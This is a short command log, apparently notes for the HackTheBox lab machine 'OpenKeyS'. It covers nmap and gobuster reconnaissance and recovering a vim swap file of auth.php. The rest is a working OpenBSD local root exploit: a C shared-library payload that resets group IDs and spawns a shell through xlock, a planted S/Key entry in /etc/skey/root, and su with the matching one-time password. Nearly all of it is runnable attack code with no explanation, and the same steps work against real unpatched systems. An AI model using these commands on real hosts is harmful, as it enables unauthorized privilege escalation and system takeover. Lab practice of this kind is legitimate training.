nmap -sTVC xxx.xxx.xxx.xxx -Pn
pt-get install gobuster
gobuster dir -u http://openkeys.htb -w /usr/share/dirb/wordlists/common.txt
wget http://openkeys.htb/includes/auth.php.swp
vim -r auth.php.swp
chmod 600 privatekey  and add end next line \n



cd /tmp

cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>

static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);

    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

gcc -fpic -shared -s -o swrast_dri.so swrast_dri.c
env -i /usr/X11R6/bin/Xvfb :66 -cc 0 &
env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display :66
echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root

chmod 0600 /etc/skey/root

env -i TERM=vt220 su -l -a skey
EGG LARD GROW HOG DRAG LAIN